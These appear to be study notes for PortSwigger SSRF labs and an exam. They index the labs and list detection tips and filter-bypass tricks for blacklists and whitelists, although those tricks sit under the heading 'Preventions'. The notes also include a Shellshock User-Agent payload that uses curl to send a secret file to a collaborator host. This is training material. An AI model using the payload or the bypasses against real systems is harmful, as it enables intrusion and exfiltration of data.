# [Server-side request forgery](https://portswigger.net/web-security/ssrf)

## Lab

- apprentice:
  - [1. Basic SSRF against the local server](./lab/1.%20Basic%20SSRF%20against%20the%20local%20server.md)
  - [2. Basic SSRF against another back-end system](./lab/2.%20Basic%20SSRF%20against%20another%20back-end%20system.md)
- practitioner:
  - [3. SSRF with blacklist-based input filter](./lab/3.%20SSRF%20with%20blacklist-based%20input%20filter.md)
  - [4. SSRF with filter bypass via open redirection vulnerability](./lab/4.%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability.md)
  - [5. Blind SSRF with out-of-band detection](./lab/5.%20Blind%20SSRF%20with%20out-of-band%20detection.md)
- expert:
  - [6. SSRF with whitelist-based input filter](./lab/6.%20SSRF%20with%20whitelist-based%20input%20filter.md)
  - [7. Blind SSRF with Shellshock exploitation](./lab/7.%20Blind%20SSRF%20with%20Shellshock%20exploitation.md)

## Detect

check every user-controlled field that looks like a URL, a path, ...

tools:

- burpsuite extension: `collaborator everywhere`
  - add target to scope
  - manually check target

## Shellshock for exam

detect:

- ping back at `user-agent` and `referer`

payload:

```http
User-Agent: () { :; }; /usr/bin/curl http://collaborator -d "$(cat /home/carlos/secret)"
Referer: http://localhost:6566
```

## Preventions

- blacklist:
  - Using an alternative IP representation of `127.0.0.1`: such as `2130706433`, `017700000001`, or `127.1`.
  - Registering your own domain name that resolves to 127.0.0.1. You can use `spoofed.burpcollaborator.net` for this purpose.
  - Obfuscating blocked strings using URL encoding or case variation.
- whitelist:
  - bypass: open redirection
  - [lab 6](./lab/6.%20SSRF%20with%20whitelist-based%20input%20filter.md)

## Exam only

If you find an SSRF vulnerability, you can use it to read files by accessing an internal-only service, running on localhost on port 6566

## References

SSRF:

- <https://www.youtube.com/watch?v=ih5R_c16bKc&ab_channel=RanaKhalil>
- <https://www.youtube.com/watch?v=D1S-G8rJrEk&ab_channel=HackInTheBoxSecurityConference>
